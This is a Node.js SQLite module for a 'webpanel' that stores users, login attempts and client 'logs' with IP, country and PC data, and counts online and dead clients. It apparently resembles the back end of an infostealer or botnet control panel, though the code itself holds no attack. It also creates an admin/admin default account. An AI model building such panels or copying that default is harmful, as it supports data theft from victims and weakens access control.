const Database = require('better-sqlite3');
const path = require('path');
const bcrypt = require('bcrypt');

const DB_PATH = path.join(__dirname, 'webpanel.db');
const db = new Database(DB_PATH);

// Enable foreign keys
db.pragma('foreign_keys = ON');

// Initialize database schema
const initDatabase = () => {
    // Users table
    db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_login DATETIME,
            is_active INTEGER DEFAULT 1
        )
    `);

    // Login attempts table (for tracking login history)
    db.exec(`
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            ip_address TEXT,
            success INTEGER DEFAULT 0,
            attempted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            user_agent TEXT
        )
    `);

    // Logs table (for client logs)
    db.exec(`
        CREATE TABLE IF NOT EXISTS logs (
            id TEXT PRIMARY KEY,
            ip TEXT,
            country TEXT,
            date DATETIME,
            data_summary TEXT,
            pc_data TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    // Create indexes for better performance
    db.exec(`
        CREATE INDEX IF NOT EXISTS idx_logs_date ON logs(date);
        CREATE INDEX IF NOT EXISTS idx_logs_ip ON logs(ip);
        CREATE INDEX IF NOT EXISTS idx_login_attempts_username ON login_attempts(username);
        CREATE INDEX IF NOT EXISTS idx_login_attempts_attempted_at ON login_attempts(attempted_at);
    `);

    // Initialize default admin user if no users exist
    const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
    if (userCount.count === 0) {
        const defaultUsername = process.env.DEFAULT_ADMIN_USERNAME || 'admin';
        const defaultPassword = process.env.DEFAULT_ADMIN_PASSWORD || 'admin';
        const passwordHash = bcrypt.hashSync(defaultPassword, 10);
        
        db.prepare(`
            INSERT INTO users (username, password_hash)
            VALUES (?, ?)
        `).run(defaultUsername, passwordHash);
        
        console.log(`Default admin user created. Username: ${defaultUsername}, Password: ${defaultPassword}`);
        console.log('⚠️  IMPORTANT: Change the default password in production!');
    }

    console.log('Database initialized successfully');
};

// User operations
const userDb = {
    findByUsername: (username) => {
        return db.prepare('SELECT * FROM users WHERE username = ? AND is_active = 1').get(username);
    },
    
    create: (username, passwordHash) => {
        try {
            const result = db.prepare(`
                INSERT INTO users (username, password_hash)
                VALUES (?, ?)
            `).run(username, passwordHash);
            return { id: result.lastInsertRowid, username };
        } catch (error) {
            if (error.code === 'SQLITE_CONSTRAINT_UNIQUE') {
                throw new Error('Username already exists');
            }
            throw error;
        }
    },
    
    updatePassword: (username, passwordHash) => {
        const result = db.prepare(`
            UPDATE users 
            SET password_hash = ?
            WHERE username = ?
        `).run(passwordHash, username);
        return result.changes > 0;
    },
    
    updateLastLogin: (username) => {
        db.prepare(`
            UPDATE users 
            SET last_login = CURRENT_TIMESTAMP
            WHERE username = ?
        `).run(username);
    },
    
    getAll: () => {
        return db.prepare('SELECT id, username, created_at, last_login, is_active FROM users').all();
    }
};

// Login attempts operations
const loginAttemptsDb = {
    create: (username, ipAddress, success, userAgent) => {
        db.prepare(`
            INSERT INTO login_attempts (username, ip_address, success, user_agent)
            VALUES (?, ?, ?, ?)
        `).run(username, ipAddress, success ? 1 : 0, userAgent);
    },
    
    getRecentAttempts: (username, minutes = 15) => {
        return db.prepare(`
            SELECT * FROM login_attempts
            WHERE username = ? AND attempted_at > datetime('now', '-' || ? || ' minutes')
            ORDER BY attempted_at DESC
        `).all(username, minutes);
    },
    
    getAll: (limit = 100) => {
        return db.prepare(`
            SELECT * FROM login_attempts
            ORDER BY attempted_at DESC
            LIMIT ?
        `).all(limit);
    }
};

// Logs operations
const logsDb = {
    create: (logData) => {
        const { id, ip, country, date, dataSummary, pcData } = logData;
        db.prepare(`
            INSERT INTO logs (id, ip, country, date, data_summary, pc_data)
            VALUES (?, ?, ?, ?, ?, ?)
        `).run(
            id,
            ip,
            country,
            date,
            JSON.stringify(dataSummary),
            JSON.stringify(pcData)
        );
    },
    
    getAll: () => {
        const logs = db.prepare('SELECT * FROM logs ORDER BY date DESC').all();
        return logs.map(log => ({
            id: log.id,
            ip: log.ip,
            country: log.country,
            date: log.date,
            dataSummary: JSON.parse(log.data_summary || '{}'),
            pcData: JSON.parse(log.pc_data || '{}')
        }));
    },
    
    getById: (logId) => {
        const log = db.prepare('SELECT * FROM logs WHERE id = ?').get(logId);
        if (!log) return null;
        return {
            id: log.id,
            ip: log.ip,
            country: log.country,
            date: log.date,
            dataSummary: JSON.parse(log.data_summary || '{}'),
            pcData: JSON.parse(log.pc_data || '{}')
        };
    },
    
    deleteByIds: (logIds) => {
        const placeholders = logIds.map(() => '?').join(',');
        const result = db.prepare(`DELETE FROM logs WHERE id IN (${placeholders})`).run(...logIds);
        return result.changes;
    },
    
    getStats: () => {
        const totalLogs = db.prepare('SELECT COUNT(*) as count FROM logs').get().count;
        
        const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
        
        const uniqueIps = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count FROM logs
        `).get().count;
        
        const onlineClients = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count 
            FROM logs 
            WHERE date > ?
        `).get(fiveMinutesAgo).count;
        
        const deadClients = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count 
            FROM logs 
            WHERE date < ?
        `).get(oneHourAgo).count;
        
        return {
            totalLogs,
            allClients: uniqueIps,
            onlineClients,
            deadClients
        };
    }
};

// Initialize database on module load
initDatabase();

module.exports = {
    db,
    userDb,
    loginAttemptsDb,
    logsDb
};

